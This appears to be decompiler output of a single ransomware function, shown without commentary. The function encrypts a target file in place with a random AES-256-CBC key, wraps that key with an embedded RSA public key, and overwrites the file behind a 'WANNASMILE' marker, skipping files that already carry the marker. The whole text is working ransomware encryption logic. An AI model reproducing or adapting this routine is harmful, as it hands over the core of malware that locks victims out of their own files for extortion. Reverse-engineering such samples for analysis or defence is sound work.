void FUN_00101351(char *param_1)

{
  RSA *rsa;
  int sizeOf_enc_key;
  EVP_CIPHER *cipher_type;
  size_t size_of_key;
  long in_FS_OFFSET;
  int out_len;
  int local_5c;
  uchar *plaintext;
  void *out;
  FILE *local_48;
  uchar *key;
  uchar *enc_key;
  size_t plaintext_len;
  EVP_CIPHER_CTX *ctx;
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  plaintext = (uchar *)0x0;
  out = (void *)0x0;
  key = (uchar *)calloc(0x21,1);
  sizeOf_enc_key = RSA_size(DAT_00303a20);
  enc_key = (uchar *)calloc((long)sizeOf_enc_key,1);
  local_48 = fopen(param_1,"rb");
  out_len = 0;
  local_5c = 0;
  if (local_48 != (FILE *)0x0) {
    fseek(local_48,0,2);
    plaintext_len = ftell(local_48);
    rewind(local_48);
    if (plaintext_len != 0) {
      plaintext = (uchar *)calloc(plaintext_len,1);
      out = calloc(plaintext_len + 0x10,1);
      fread(plaintext,1,plaintext_len,local_48);
      fclose(local_48);
      sizeOf_enc_key = memcmp("WANNASMILE",plaintext,10);
      if (sizeOf_enc_key != 0) {
        FUN_0010127a(key,0x20);
        ctx = EVP_CIPHER_CTX_new();
        cipher_type = EVP_aes_256_cbc();
        EVP_EncryptInit_ex(ctx,cipher_type,(ENGINE *)0x0,key,(uchar *)0x0);
        EVP_EncryptUpdate(ctx,(uchar *)((long)local_5c + (long)out),&out_len,plaintext,
                          (int)plaintext_len);
        local_5c = local_5c + out_len;
        EVP_EncryptFinal_ex(ctx,(uchar *)((long)out_len + (long)out),&out_len);
        local_5c = local_5c + out_len;
        EVP_CIPHER_CTX_free(ctx);
        rsa = DAT_00303a20;
        size_of_key = strlen((char *)key);
        RSA_public_encrypt((int)size_of_key,key,enc_key,rsa,1);
        local_48 = fopen(param_1,"wb");
        fwrite("WANNASMILE",1,10,local_48);
        sizeOf_enc_key = RSA_size(DAT_00303a20);
        fwrite(enc_key,1,(long)sizeOf_enc_key,local_48);
        fwrite(out,1,(long)local_5c,local_48);
      }
    }
  }
  if (plaintext != (uchar *)0x0) {
    free(plaintext);
  }
  if (out != (void *)0x0) {
    free(out);
  }
  if (key != (uchar *)0x0) {
    free(key);
  }
  if (enc_key != (uchar *)0x0) {
    free(enc_key);
  }
  fclose(local_48);
  if (local_20 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
